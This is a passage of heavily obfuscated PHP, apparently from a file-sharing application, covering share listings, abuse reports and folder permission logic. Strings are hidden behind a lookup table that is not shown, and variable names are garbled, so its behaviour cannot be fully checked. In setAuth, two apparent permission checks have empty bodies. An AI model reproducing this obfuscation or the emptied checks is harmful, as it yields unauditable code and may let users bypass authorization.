$this->field($î˚†˚Î∏[679])->where($„ûΩãâû)->select(); $â°ñËÌ = array_to_keyvalue($Õ«•úñ–, $î˚†˚Î∏[12], $î˚†˚Î∏[679]); if (!$â°ñËÌ) { return; } foreach ($Õ«•úñ– as $Ωö¶¿∏Î) { $this->shareInfoMofify($Ωö¶¿∏Î, $î˚†˚Î∏[2137]); } $„ûΩãâû = array($î˚†˚Î∏[2159] => array($î˚†˚Î∏[503], $â°ñËÌ)); $this->where($„ûΩãâû)->delete(); Model($î˚†˚Î∏[680])->where($„ûΩãâû)->delete(); } public function listAll($ÊßÓﬂÔ÷) { $§†àÿÒí =& $_SERVER[ˆë€Ï⁄∂]; $≤Ñãä´„ = array(); if ($ÊßÓﬂÔ÷[$§†àÿÒí[1787]]) { $≤Ñãä´„[$§†àÿÒí[1787]] = $ÊßÓﬂÔ÷[$§†àÿÒí[1787]]; } if ($ÊßÓﬂÔ÷[$§†àÿÒí[851]]) { $ç≤∆€Ø° = $ÊßÓﬂÔ÷[$§†àÿÒí[852]] ? $ÊßÓﬂÔ÷[$§†àÿÒí[852]] : strtotime(date($§†àÿÒí[2167])); $≤Ñãä´„[$§†àÿÒí[243]] = array($§†àÿÒí[419], array($ÊßÓﬂÔ÷[$§†àÿÒí[851]], $ç≤∆€Ø°)); } if ($ÊßÓﬂÔ÷[$§†àÿÒí[33]]) { $≤Ñãä´„[$ÊßÓﬂÔ÷[$§†àÿÒí[33]]] = 1; } else { $≤Ñãä´„[] = array($§†àÿÒí[573] => array($§†àÿÒí[1104], 0), $§†àÿÒí[677] => array($§†àÿÒí[1104], 0), $§†àÿÒí[2141] => $§†àÿÒí[2090]); } if ($ÊßÓﬂÔ÷[$§†àÿÒí[2086]]) { $≤Ñãä´„[] = array($§†àÿÒí[2138] => $ÊßÓﬂÔ÷[$§†àÿÒí[2086]], $§†àÿÒí[1675] => array($§†àÿÒí[470], "\x25{$ÊßÓﬂÔ÷[$§†àÿÒí[2086]]}\45"), $§†àÿÒí[2141] => $§†àÿÒí[2090]); } $•√»å√À = $this->_makeOrder()->where($≤Ñãä´„)->selectPage(20); if (empty($•√»å√À[$§†àÿÒí[456]])) { return array(); } $this->_listDataApply($•√»å√À[$§†àÿÒí[456]]); return $•√»å√À; } public function listDataApply($˝˝Ó›’á) { $this->_listDataApply($˝˝Ó›’á); return $˝˝Ó›’á; } private function _listDataApply(&$Ä”«ÿŒÌ) { $úÀ—ÚÅÅ =& $_SERVER[ˆë€Ï⁄∂]; $•“œÏÃæ = array_to_keyvalue($Ä”«ÿŒÌ, $úÀ—ÚÅÅ[12], $úÀ—ÚÅÅ[1787]); $Êâç∫¡Ê = Model($úÀ—ÚÅÅ[608])->userListInfo(array_unique($•“œÏÃæ)); $æéÅ·é™ = array_to_keyvalue($Ä”«ÿŒÌ, $úÀ—ÚÅÅ[12], $úÀ—ÚÅÅ[203]); $éÙäò≤ˆ = Model($úÀ—ÚÅÅ[916])->sourceListInfo($æéÅ·é™, !0); foreach ($Ä”«ÿŒÌ as $’‹å¥ﬁ» => &$Ïﬂêçäå) { $‹˜éÙ—Æ = $Ïﬂêçäå[$úÀ—ÚÅÅ[1787]]; $Ïﬂêçäå[$úÀ—ÚÅÅ[2168]] = $Êâç∫¡Ê[$‹˜éÙ—Æ] ? $Êâç∫¡Ê[$‹˜éÙ—Æ] : !1; if (!$Ïﬂêçäå[$úÀ—ÚÅÅ[2168]] || $Ïﬂêçäå[$úÀ—ÚÅÅ[2168]][$úÀ—ÚÅÅ[841]] != $úÀ—ÚÅÅ[101]) { unset($Ä”«ÿŒÌ[$’‹å¥ﬁ»]); continue; } $ú·Û™÷∞ = $Ïﬂêçäå[$úÀ—ÚÅÅ[203]]; $Ïﬂêçäå[$úÀ—ÚÅÅ[100]] = $éÙäò≤ˆ[$ú·Û™÷∞] ? $éÙäò≤ˆ[$ú·Û™÷∞] : !1; if ($Ïﬂêçäå[$úÀ—ÚÅÅ[100]][$úÀ—ÚÅÅ[516]] == $úÀ—ÚÅÅ[101]) { unset($Ä”«ÿŒÌ[$’‹å¥ﬁ»]); } if ($Ïﬂêçäå[$úÀ—ÚÅÅ[100]] != $úÀ—ÚÅÅ[240] && !$Ïﬂêçäå[$úÀ—ÚÅÅ[100]]) { unset($Ä”«ÿŒÌ[$’‹å¥ﬁ»]); } } unset($Ïﬂêçäå); $Ä”«ÿŒÌ = array_values($Ä”«ÿŒÌ); } private function _makeOrder($ÕÒ–ó§ä = '') { $©‰√ñéÇ =& $_SERVER[ˆë€Ï⁄∂]; $π¸©¿—ù = array($©‰√ñéÇ[243], $©‰√ñéÇ[852], $©‰√ñéÇ[2155], $©‰√ñéÇ[2156]); $àÜµ˛÷ì = array($©‰√ñéÇ[534] => $©‰√ñéÇ[535], $©‰√ñéÇ[536] => $©‰√ñéÇ[537]); $≠‘‚ó…Â = Input::get($©‰√ñéÇ[541], $©‰√ñéÇ[7], $©‰√ñéÇ[508], $π¸©¿—ù); $—¨˚ä®¡ = Input::get($©‰√ñéÇ[542], $©‰√ñéÇ[7], $©‰√ñéÇ[2169], array($©‰√ñéÇ[2083], $©‰√ñéÇ[536])); $—¨˚ä®¡ = $àÜµ˛÷ì[$—¨˚ä®¡]; $ÕÒ–ó§ä = $ÕÒ–ó§ä . "{$≠‘‚ó…Â}\40{$—¨˚ä®¡}"; return $this->order($ÕÒ–ó§ä); } public function reportAdd($‰’ﬂ¶è¸) { $ËªÅéë¬ =& $_SERVER[ˆë€Ï⁄∂]; $é˜ØÙ‹œ = array($ËªÅéë¬[679] => $‰’ﬂ¶è¸[$ËªÅéë¬[679]], $ËªÅéë¬[1787] => USER_ID); if (Model($ËªÅéë¬[2165])->where($é˜ØÙ‹œ)->find()) { return !1; } $¢ôáÊ∑  = array($ËªÅéë¬[679] => $‰’ﬂ¶è¸[$ËªÅéë¬[679]], $ËªÅéë¬[1675] => $‰’ﬂ¶è¸[$ËªÅéë¬[1675]], $ËªÅéë¬[203] => $‰’ﬂ¶è¸[$ËªÅéë¬[203]], $ËªÅéë¬[552] => $‰’ﬂ¶è¸[$ËªÅéë¬[552]], $ËªÅéë¬[1787] => USER_ID, $ËªÅéë¬[33] => $‰’ﬂ¶è¸[$ËªÅéë¬[33]], $ËªÅéë¬[537] => $‰’ﬂ¶è¸[$ËªÅéë¬[537]]); return Model($ËªÅéë¬[2165])->add($¢ôáÊ∑ ); } public function reportList($éÿ˝°”Ç) { $”û”ΩŸŒ =& $_SERVER[ˆë€Ï⁄∂]; $ºÅê∑ª° = array(); if ($éÿ˝°”Ç[$”û”ΩŸŒ[851]]) { $œªÚ»™µ = $éÿ˝°”Ç[$”û”ΩŸŒ[852]] ? $éÿ˝°”Ç[$”û”ΩŸŒ[852]] : strtotime(date($”û”ΩŸŒ[2167])); $ºÅê∑ª°[$”û”ΩŸŒ[243]] = array($”û”ΩŸŒ[419], array($éÿ˝°”Ç[$”û”ΩŸŒ[851]], $œªÚ»™µ)); } if (isset($éÿ˝°”Ç[$”û”ΩŸŒ[33]]) && in_array($éÿ˝°”Ç[$”û”ΩŸŒ[33]], array($”û”ΩŸŒ[101], $”û”ΩŸŒ[521], $”û”ΩŸŒ[2170], $”û”ΩŸŒ[2171], $”û”ΩŸŒ[2172]))) { $ºÅê∑ª°[$”û”ΩŸŒ[33]] = $éÿ˝°”Ç[$”û”ΩŸŒ[33]]; } if (isset($éÿ˝°”Ç[$”û”ΩŸŒ[841]]) && in_array($éÿ˝°”Ç[$”û”ΩŸŒ[841]], array($”û”ΩŸŒ[240], $”û”ΩŸŒ[101], $”û”ΩŸŒ[521], $”û”ΩŸŒ[2170]))) { $ºÅê∑ª°[$”û”ΩŸŒ[841]] = $éÿ˝°”Ç[$”û”ΩŸŒ[841]]; } $˝≈®˛Â≠ = Input::get($”û”ΩŸŒ[542], $”û”ΩŸŒ[7], $”û”ΩŸŒ[2169], array($”û”ΩŸŒ[2083], $”û”ΩŸŒ[536])); $•ÒÆ•á» = array($”û”ΩŸŒ[534] => $”û”ΩŸŒ[535], $”û”ΩŸŒ[536] => $”û”ΩŸŒ[537]); $ö¨æØ¥Ú = $”û”ΩŸŒ[2173] . $•ÒÆ•á»[$˝≈®˛Â≠]; $«Ë≤Â∑Ô = Model($”û”ΩŸŒ[2165])->where($ºÅê∑ª°)->order($ö¨æØ¥Ú)->selectPage(20); if (empty($«Ë≤Â∑Ô[$”û”ΩŸŒ[456]])) { return array(); } $„∑¯•–Œ = array_to_keyvalue_group($«Ë≤Â∑Ô[$”û”ΩŸŒ[456]], $”û”ΩŸŒ[841], $”û”ΩŸŒ[679]); if (!empty($„∑¯•–Œ[0])) { $éÿ˝°”Ç = $„∑¯•–Œ[0]; $ºÅê∑ª° = array($”û”ΩŸŒ[679] => array($”û”ΩŸŒ[7], $éÿ˝°”Ç)); $Ç…≈⁄¨¿ = $this->where($ºÅê∑ª°)->field($”û”ΩŸŒ[679])->select(); $Ç…≈⁄¨¿ = array_to_keyvalue($Ç…≈⁄¨¿, $”û”ΩŸŒ[12], $”û”ΩŸŒ[679]); $ºÉÖçô¨ = array_diff($éÿ˝°”Ç, $Ç…≈⁄¨¿); if (!empty($ºÉÖçô¨)) { foreach ($«Ë≤Â∑Ô[$”û”ΩŸŒ[456]] as $≤æ≈Ï·Ÿ => $∏ ™…—Ÿ) { if (in_array($∏ ™…—Ÿ[$”û”ΩŸŒ[679]], $ºÉÖçô¨)) { unset($«Ë≤Â∑Ô[$”û”ΩŸŒ[456]][$≤æ≈Ï·Ÿ]); } } } } $this->_listDataApply($«Ë≤Â∑Ô[$”û”ΩŸŒ[456]]); return $«Ë≤Â∑Ô; } public function reportStatus($Œ¢êÁ¥œ) { $§Û¡ŸÎì =& $_SERVER[ˆë€Ï⁄∂]; $ãﬁÔä¶Ï = array($§Û¡ŸÎì[486] => $Œ¢êÁ¥œ[$§Û¡ŸÎì[486]]); $˚¶¿‚ﬁı = Model($§Û¡ŸÎì[2165])->where($ãﬁÔä¶Ï)->field($§Û¡ŸÎì[2174])->find(); if (!$˚¶¿‚ﬁı) { return !1; } $Ã‚ÍàÀ∑ = array($§Û¡ŸÎì[841] => $Œ¢êÁ¥œ[$§Û¡ŸÎì[841]]); if ($Œ¢êÁ¥œ[$§Û¡ŸÎì[841]] == $§Û¡ŸÎì[2170] && $˚¶¿‚ﬁı[$§Û¡ŸÎì[841]] == $§Û¡ŸÎì[2170]) { $Ã‚ÍàÀ∑[$§Û¡ŸÎì[841]] = 0; } $∞√À£¬Ü = Model($§Û¡ŸÎì[2165])->where($ãﬁÔä¶Ï)->save($Ã‚ÍàÀ∑); if ($Œ¢êÁ¥œ[$§Û¡ŸÎì[841]] == $§Û¡ŸÎì[521]) { if ($˚¶¿‚ﬁı[$§Û¡ŸÎì[552]] != $§Û¡ŸÎì[240] && $this->shareFileMeta($˚¶¿‚ﬁı[$§Û¡ŸÎì[552]])) { $this->shareFileMeta($˚¶¿‚ﬁı[$§Û¡ŸÎì[552]], 0); } $this->remove($˚¶¿‚ﬁı[$§Û¡ŸÎì[679]]); return !0; } if ($∞√À£¬Ü && $Œ¢êÁ¥œ[$§Û¡ŸÎì[841]] == $§Û¡ŸÎì[2170]) { $ÓËÑ∂ı’ = $Ã‚ÍàÀ∑[$§Û¡ŸÎì[841]] == $§Û¡ŸÎì[2170] ? 1 : 0; $this->shareFileMeta($˚¶¿‚ﬁı[$§Û¡ŸÎì[552]], $ÓËÑ∂ı’); $this->removeByFile($˚¶¿‚ﬁı[$§Û¡ŸÎì[552]]); } return $∞√À£¬Ü; } private function removeByFile($ãÛ˙¸ûƒ) { $œè∂ÑÃÚ =& $_SERVER[ˆë€Ï⁄∂]; $â í†Ç’ = Model($œè∂ÑÃÚ[916])->where(array($œè∂ÑÃÚ[552] => $ãÛ˙¸ûƒ))->field($œè∂ÑÃÚ[203])->select(); $÷®ìÊ”” = array_to_keyvalue($â í†Ç’, $œè∂ÑÃÚ[12], $œè∂ÑÃÚ[203]); $Ê’ë°õî = array($œè∂ÑÃÚ[203] => array($œè∂ÑÃÚ[7], $÷®ìÊ””), $œè∂ÑÃÚ[573] => 1); $â í†Ç’ = $this->where($Ê’ë°õî)->field($œè∂ÑÃÚ[679])->select(); if (empty($â í†Ç’)) { return; } $øèÒÖ˘Ë = array_to_keyvalue($â í†Ç’, $œè∂ÑÃÚ[12], $œè∂ÑÃÚ[679]); $this->remove($øèÒÖ˘Ë); } private function shareFileMeta($ﬁæÅ’Í€, $§¬’†öì = null) { $ÂﬁÙ¥üå =& $_SERVER[ˆë€Ï⁄∂]; $÷˘¯“ﬂô = array($ÂﬁÙ¥üå[552] => $ﬁæÅ’Í€, $ÂﬁÙ¥üå[107] => $ÂﬁÙ¥üå[2175]); if (is_null($§¬’†öì)) { return Model($ÂﬁÙ¥üå[2176])->where($÷˘¯“ﬂô)->find(); } $÷˘¯“ﬂô[$ÂﬁÙ¥üå[461]] = $§¬’†öì; Model($ÂﬁÙ¥üå[2176])->add($÷˘¯“ﬂô, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\143\145\x5f\141\x75\x74\150"; public function getAuth($ï∑€ÂÕ») { $ËÄ™ìäÅ =& $_SERVER[ˆë€Ï⁄∂]; $å Á˜úÄ = $this->sourceAuthSelect($ï∑€ÂÕ»); $⁄Â≠ŒøÉ = array(); $¿‹‚ÍéÑ = array(); $Á¸ææ±‚ = 2 << 25; foreach ($å Á˜úÄ as $áÛÿ•÷ï) { $ñ∆µÀ™â = Model($ËÄ™ìäÅ[582])->listData($áÛÿ•÷ï[$ËÄ™ìäÅ[2096]]); if (!$ñ∆µÀ™â) { continue; } $⁄Â≠ŒøÉ[] = $áÛÿ•÷ï; $≤™ÙçÛæ = 0; if ($áÛÿ•÷ï[$ËÄ™ìäÅ[200]] == SourceModel::TYPE_GROUP) { $≤™ÙçÛæ = $Á¸ææ±‚ * 2; } if ($áÛÿ•÷ï[$ËÄ™ìäÅ[200]] == SourceModel::TYPE_USER) { $≤™ÙçÛæ = $Á¸ææ±‚; } if ($áÛÿ•÷ï[$ËÄ™ìäÅ[200]] == SourceModel::TYPE_USER && $áÛÿ•÷ï[$ËÄ™ìäÅ[580]] == $ËÄ™ìäÅ[240]) { $≤™ÙçÛæ = 0; } $¿‹‚ÍéÑ[] = $ñ∆µÀ™â[$ËÄ™ìäÅ[498]] + $≤™ÙçÛæ; } array_multisort($¿‹‚ÍéÑ, SORT_DESC, $⁄Â≠ŒøÉ); return $⁄Â≠ŒøÉ; } public function sourceAuthSelect($¿ÃÇ‘‹Œ) { $Îº¡°Ã§ =& $_SERVER[ˆë€Ï⁄∂]; static $•∂ œ≤â = array(); $†óàø«Ç = is_array($¿ÃÇ‘‹Œ) ? !1 : !0; if ($†óàø«Ç) { $¿ÃÇ‘‹Œ = array($¿ÃÇ‘‹Œ); } $ı˘«øêä = array(); foreach ($¿ÃÇ‘‹Œ as $‘…⁄¡Ê¬) { if (isset($•∂ œ≤â[$‘…⁄¡Ê¬])) { $ı˘«øêä[$‘…⁄¡Ê¬] = $•∂ œ≤â[$‘…⁄¡Ê¬]; } } if (count($ı˘«øêä) == count($¿ÃÇ‘‹Œ)) { return $†óàø«Ç ? $ı˘«øêä[$¿ÃÇ‘‹Œ[0]] : $ı˘«øêä; } $¸≠á®Àè = $Îº¡°Ã§[2177]; $ïÛÄ™æ˙ = array($Îº¡°Ã§[203] => array($Îº¡°Ã§[7], $¿ÃÇ‘‹Œ)); $¢êÚ“Èá = $this->field($¸≠á®Àè)->order($Îº¡°Ã§[486])->where($ïÛÄ™æ˙)->select(); $ÉÇ≈Ω≥Ñ = array_to_keyvalue_group($¢êÚ“Èá, $Îº¡°Ã§[203]); foreach ($¿ÃÇ‘‹Œ as $‘…⁄¡Ê¬) { $•∂ œ≤â[$‘…⁄¡Ê¬] = $ÉÇ≈Ω≥Ñ[$‘…⁄¡Ê¬] ? $ÉÇ≈Ω≥Ñ[$‘…⁄¡Ê¬] : array(); } if ($†óàø«Ç) { return $¢êÚ“Èá; } return $ÉÇ≈Ω≥Ñ; } public function setAuth($öÕ«∆ªù, $¡êäÔâ) { $◊ÇÙç√É =& $_SERVER[ˆë€Ï⁄∂]; $áïúÊ”ø = Model($◊ÇÙç√É[1436])->sourceInfo($öÕ«∆ªù); if (!$áïúÊ”ø) { return !1; } if ($áïúÊ”ø[$◊ÇÙç√É[200]] != SourceModel::TYPE_GROUP) { return !1; } $∆≠«É˜◊ = 1; $Ù›€–“Ø = $áïúÊ”ø[$◊ÇÙç√É[580]]; if ($Ù›€–“Ø != $∆≠«É˜◊) { $—ﬁäÛ¬º = array($◊ÇÙç√É[1988] => $Ù›€–“Ø); $å¬ÉòÓê = Model($◊ÇÙç√É[2082])->field($◊ÇÙç√É[1787])->where($—ﬁäÛ¬º)->select(); $å¬ÉòÓê = array_to_keyvalue($å¬ÉòÓê, $◊ÇÙç√É[12], $◊ÇÙç√É[1787]); } $‚Ü∑ã∆ø = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $÷âØº‚Ñ = array(); foreach ($¡êäÔâ as $˘úÈæÌŒ) { if (!in_array($˘úÈæÌŒ[$◊ÇÙç√É[200]], $‚Ü∑ã∆ø)) { show_json(LNG($◊ÇÙç√É[2178]), !1); } if ($Ù›€–“Ø != $∆≠«É˜◊) { if ($˘úÈæÌŒ[$◊ÇÙç√É[200]] == SourceModel::TYPE_GROUP) { } if ($˘úÈæÌŒ[$◊ÇÙç√É[580]] != 0 && !in_array($˘úÈæÌŒ[$◊ÇÙç√É[580]], $å¬ÉòÓê)) { } } if ($˘úÈæÌŒ[$◊ÇÙç√É[580]] == 0) { $˘úÈæÌŒ[$◊ÇÙç√É[200]] = SourceModel::TYPE_USER; } $÷âØº‚Ñ[] = array($◊ÇÙç√É[203] => $öÕ«∆ªù, $◊ÇÙç√É[200] => intval($˘úÈæÌŒ[$◊ÇÙç√É[200]]), $◊ÇÙç√É[580] => intval($˘úÈæÌŒ[$◊ÇÙç√É[580]]), $◊ÇÙç√É[2096] => intval($˘úÈæÌŒ[$◊ÇÙç√É[2096]]) ? intval($˘úÈæÌŒ[$◊ÇÙç√É[2096]]) : 0, $◊ÇÙç√É[2160] => intval($˘úÈæÌŒ[$◊ÇÙç√É[2160]]) ? intval($˘úÈæÌŒ[$◊ÇÙç√É[2160]]) : -1); } $this->where(array($◊ÇÙç√É[502] => $öÕ«∆ªù))->delete(); $this->addAll($÷âØº‚Ñ); return !0; } public function authClear($œÚå∆¢–) { $êÒîŸØŒ =& $_SERVER[ˆë€Ï⁄∂]; $Ωıõ‰∂¬ = Model($êÒîŸØŒ[1436])->sourceInfo($œÚå∆¢–); $ìèä¿‰ã = array($œÚå∆¢–); if ($Ωıõ‰∂¬[$êÒîŸØŒ[496]] == $êÒîŸØŒ[101]) { $“˜‘Á ä = array($êÒîŸØŒ[666] => array($êÒîŸØŒ[626], $Ωıõ‰∂¬[$êÒîŸØŒ[595]] . $œÚå∆¢– . $êÒîŸØŒ[627])); $ìèä¿‰ã = Model($êÒîŸØŒ[1436])->field($êÒîŸØŒ[502])->where($“˜‘Á ä)->getField($êÒîŸØŒ[203], !0); $ìèä¿‰ã[] = $œÚå∆¢–; } $this->where(array($êÒîŸØŒ[502] => array($êÒîŸØŒ[503], $ìèä¿‰ã)))->delete(); return !0; } public function getAllChildren($‡™¨é‡Æ) { $µßØÎûˆ =& $_SERVER[ˆë€Ï⁄∂]; $“«—≠âÄ = Model($µßØÎûˆ[1436])->sourceInfo($‡™¨é‡Æ); if ($“«—≠âÄ[$µßØÎûˆ[496]] != $µßØÎûˆ[101]) { return $this->sourceListAuth(array($‡™¨é‡Æ)); } if ($“«—≠âÄ[$µßØÎûˆ[200]] != SourceModel::TYPE_GROUP) { return array(); } $Ô–˚»∏Í = 1; $∆∑ËΩíô = array($‡™¨é‡Æ); if ($“«—≠âÄ[$µßØÎûˆ[202]] == $µßØÎûˆ[240] && $“«—≠âÄ[$µßØÎûˆ[580]] != $Ô–˚»∏Í) { $∆∑ËΩíô = $this->groupChidldAllRootSource($“«—≠âÄ[$µßØÎûˆ[580]]); } $ø†æâ·– = $this->field($µßØÎûˆ[203])->group($µßØÎûˆ[203])->select(); $ø†æâ·– = array_to_keyvalue($ø†æâ·–, $µßØÎûˆ[12], $µßØÎûˆ[203]); if (!$ø†æâ·–) { return array(); } $º›∞–œ¨ = $µßØÎûˆ[2179]; $˛¥Â√˘ˆ = array($µßØÎûˆ[203] => array($µßØÎûˆ[7], $ø†æâ·–), $µßØÎûˆ[516] => $µßØÎûˆ[240]); $é∂Ì€˜± = Model($µßØÎûˆ[916])->field($º›∞–œ¨)->where($˛¥Â√˘ˆ)->select(); $‚¿Ω◊•º = array($‡™¨é‡Æ); foreach ($é∂Ì€˜± as $äﬂî“„Î) { foreach ($∆∑ËΩíô as $ï≠—±æ¯) { $ç·â—Èﬂ = $µßØÎûˆ[50] . $ï≠—±æ¯ . $µßØÎûˆ[50]; $ƒØñì‚¡ = $äﬂî“„Î[$µßØÎûˆ[595]] . $äﬂî“„Î[$µßØÎûˆ[203]] . $µßØÎûˆ[50]; if (strstr($ƒØñì‚¡, $ç·â—Èﬂ)) { $‚¿Ω◊•º[] = $äﬂî“„Î[$µßØÎûˆ[203]]; break; } } } return $this->sourceListAuth($‚¿Ω◊•º); } private function sourceListAuth($ñâ≠˝µƒ) { $¸£˝¥äÀ =& $_SERVER[ˆë€Ï⁄∂]; $˝˛¬πÜﬁ = Model($¸£˝¥äÀ[1436])->sourceListInfo($ñâ≠˝µƒ, !0); $⁄˜‹Ì‰ = $this->sourceAuthSelect($ñâ≠˝µƒ); $ûÎπˆ—ß = array(); $ß¨Æ„Êå = array(); foreach ($˝˛¬πÜﬁ as $≥π∑±üÈ) { unset($≥π∑±üÈ[$¸£˝¥äÀ[540]]); unset($≥π∑±üÈ[$¸£˝¥äÀ[538]]); unset($≥π∑±üÈ[$¸£˝¥äÀ[498]]); unset($≥π∑±üÈ[$¸£˝¥äÀ[100]]); $ÖÓ∂óØÏ = $⁄˜‹Ì‰[$≥π∑±üÈ[$¸£˝¥äÀ[203]]]; if (!$ÖÓ∂óØÏ) { continue; } $≥π∑±üÈ[$¸£˝¥äÀ[2180]] = $this->authTargetInfo($ÖÓ∂óØÏ); $≥π∑±üÈ[$¸£˝¥äÀ[593]] = rtrim($≥π∑±üÈ[$¸£˝¥äÀ[599]], $¸£˝¥äÀ[8]) . $¸£˝¥äÀ[8] . ltrim($≥π∑±üÈ[$¸£˝¥äÀ[593]], $¸£˝¥äÀ[8]); $ûÎπˆ—ß[] = $≥π∑±üÈ; $∆≥†Óàé = count(explode($¸£˝¥äÀ[8], trim($≥π∑±üÈ[$¸£˝¥äÀ[593]], $¸£˝¥äÀ[8]))); $ß¨Æ„Êå[] = $∆≥†Óàé + ($≥π∑±üÈ[$¸£˝¥äÀ[33]] == $¸£˝¥äÀ[88] ? 0 : 1000); } array_multisort($ß¨Æ„Êå, SORT_ASC, $ûÎπˆ—ß); return $ûÎπˆ—ß; } private function groupChidldAllRootSource($™¯«í† ) { $ÚÙ‚±Û— =& $_SERVER[ˆë€Ï⁄∂]; $ûÚ“Ù≠ø = Model($ÚÙ‚±Û—[2181])->groupChildrenAll($™¯«í† ); $èìƒ‘˘‘ = array($ÚÙ‚±Û—[202] => 0, $ÚÙ‚±Û—[580] => array($ÚÙ‚±Û—[7], $ûÚ“Ù≠ø), $ÚÙ‚±Û—[200] => SourceModel::TYPE_GROUP); $äúÔ∞¯¿ = Model($ÚÙ‚±Û—[916])->field($ÚÙ‚±Û—[203])->where($èìƒ‘˘‘)->select(); $äúÔ∞¯¿ = array_to_keyvalue($äúÔ∞¯¿, $ÚÙ‚±Û—[12], $ÚÙ‚±Û—[203]); return $äúÔ∞¯¿; } private function authTargetInfo($‡˜œ±êÀ) { $Ö¯â¶Æ∫ =& $_SERVER[ˆë€Ï⁄∂]; $àµ£æú˝ = array(); $˙–ì°∞ñ = array(); $≥Ö–œ°ë = 2 << 25; foreach ($‡˜œ±êÀ as $•°èßåë) { $ÏÛ‡»≥ = Model($Ö¯â¶Æ∫[582])->listData($•°èßåë[$Ö¯â¶Æ∫[2096]]); if (!$ÏÛ‡»≥) { continue; } if ($•°èßåë[$Ö¯â¶Æ∫[200]] == SourceModel::TYPE_USER) { $≤Æ≥ıøø = Model($Ö¯â¶Æ∫[588])->getInfoSimpleOuter($•°èßåë[$Ö¯â¶Æ∫[580]]); if ($≤Æ≥ıøø[$Ö¯â¶Æ∫[1787]] == $Ö¯â¶Æ∫[1288]) { continue; } if ($≤Æ≥ıøø[$Ö¯â¶Æ∫[1787]] == $Ö¯â¶Æ∫[240]) { $≤Æ≥ıøø[$Ö¯â¶Æ∫[32]] = LNG($Ö¯â¶Æ∫[2182]); } } else { $≤Æ≥ıøø = Model($Ö¯â¶Æ∫[596])->getInfoSimple($•°èßåë[$Ö¯â¶Æ∫[580]]); } if (!$≤Æ≥ıøø) { continue; } $≤Æ≥ıøø[$Ö¯â¶Æ∫[551]] = $ÏÛ‡»≥; $àµ£æú˝[] = $≤Æ≥ıøø; $“Ë∆œÆ‹ = 0; if ($•°èßåë[$Ö¯â¶Æ∫[200]] == SourceModel::TYPE_GROUP) { $“Ë∆œÆ‹ = $≥Ö–œ°ë * 2; } if ($•°èßåë[$Ö¯â¶Æ∫[200]] == SourceModel::TYPE_USER) { $“Ë∆œÆ‹ = $≥Ö–œ°ë; } if ($•°èßåë[$Ö¯â¶Æ∫[200]] == SourceModel::TYPE_USER && $•°èßåë[$Ö¯â¶Æ∫[580]] == $Ö¯â¶Æ∫[240]) { $“Ë∆œÆ‹ = 0; } $˙–ì°∞ñ[] = $ÏÛ‡»≥[$Ö¯â¶Æ∫[498]] + $“Ë∆œÆ‹; } array_multisort($˙–ì°∞ñ, SORT_DESC, $àµ£æú˝); return $àµ£æú˝; } public function getAllChildrenByUser($≠ˆÙÚ˘ñ, $ÖúÀΩÙ) { $ö€§≠®Œ =& $_SERVER[ˆë€Ï⁄∂]; $ÆµÃü÷î = Model($ö€§≠®Œ[608])->getInfo($ÖúÀΩÙ); if (!$ÖúÀΩÙ || !$≠ˆÙÚ˘ñ || !$ÆµÃü÷î) { return array(); } $ÓºÎ·∂• = Model($ö€§≠®Œ[1436])->sourceInfo($≠ˆÙÚ˘ñ); $ö®ıà≠ÿ = array(); $òΩö©Ö÷ = 1; if ($ÓºÎ·∂•[$ö€§≠®Œ[202]] == $ö€§≠®Œ[240] && $ÓºÎ·∂•[$ö€§≠®Œ[580]] != $òΩö©Ö÷ && $this->groupContainUser($ÓºÎ·∂•[$ö€§≠®Œ[580]], $ÖúÀΩÙ)) { foreach ($ÆµÃü÷î[$ö€§≠®Œ[2183]] as $ã¶˛ﬂ≤°) { $≥ØÎÊêê = Model($ö€§≠®Œ[596])->getInfo($ã¶˛ﬂ≤°[$ö€§≠®Œ[1988]]); $Ø¶Ã´§ò = Model($ö€§≠®Œ[608])->getInfoSimpleOuter($ÖúÀΩÙ); $Ø¶Ã´§ò[$ö€§≠®Œ[551]] = $ã¶˛ﬂ≤°[$ö€§≠®Œ[498]]; if (Model($ö€§≠®Œ[582])->authCheckAction($ã¶˛ﬂ≤°[$ö€§≠®Œ[498]][$ö€§≠®Œ[498]], $ö€§≠®Œ[2009])) { continue; } $∞œ¥Í”§ = array($ö€§≠®Œ[32] => $ö€§≠®Œ[1308] . $≥ØÎÊêê[$ö€§≠®Œ[32]], $ö€§≠®Œ[203] => $≥ØÎÊêê[$ö€§≠®Œ[100]][$ö€§≠®Œ[203]], $ö€§≠®Œ[97] => KodIO::make($≥ØÎÊêê[$ö€§≠®Œ[100]][$ö€§≠®Œ[203]]), $ö€§≠®Œ[202] => $ö€§≠®Œ[240], $ö€§≠®Œ[200] => $ö€§≠®Œ[589], $ö€§≠®Œ[33] => $ö€§≠®Œ[630], $ö€§≠®Œ[593] => $≥ØÎÊêê[$ö€§≠®Œ[600]], $ö€§≠®Œ[1988] => $≥ØÎÊêê[$ö€§≠®Œ[1988]], $ö€§≠®Œ[597] => $≥ØÎÊêê[$ö€§≠®Œ[202]], $ö€§≠®Œ[2180] => array($Ø¶Ã´§ò)); $ö®ıà≠ÿ[$∞œ¥Í”§[$ö€§≠®Œ[203]]] = $∞œ¥Í”§; } } $—¿Îáß© = array(); $ÊÛé’ìË = $this->getAllChildren($≠ˆÙÚ˘ñ); foreach ($ÊÛé’ìË as $™◊∑«ä) { $çÛçﬂÿõ = !1; foreach ($™◊∑«ä[$ö€§≠®Œ[2180]] as $äÂçÄ–∑) { if ($äÂçÄ–∑[$ö€§≠®Œ[1787]]) { if ($äÂçÄ–∑[$ö€§≠®Œ[1787]] == $ÖúÀΩÙ) { $çÛçﬂÿõ = !0; break; } } if ($äÂçÄ–∑[$ö€§≠®Œ[1988]]) { if ($this->groupContainUser($äÂçÄ–∑[$ö€§≠®Œ[1988]], $ÖúÀΩÙ)) { $çÛçﬂÿõ = !0; break; } } } if ($çÛçﬂÿõ) { $—¿Îáß©[] = $™◊∑«ä; } $¡›ı«Âê = $™◊∑«ä[$ö€§≠®Œ[203]]; if (isset($ö®ıà≠ÿ[$¡›ı«Âê])) { $™◊∑«ä[$ö€§≠®Œ[2180]][] = $ö®ıà≠ÿ[$¡›ı«Âê][0]; $ö®ıà≠ÿ[$¡›ı«Âê] = !1; } } $ö®ıà≠ÿ = array_filter(array_values($ö®ıà≠ÿ)); $—¿Îáß© = array_merge($ö®ıà≠ÿ, $—¿Îáß©); return $—¿Îáß©; } public function setAllChildrenByUser($Ú⁄”î±©, $ïßù”§Ê, $‚¸Œ¬ıË) { 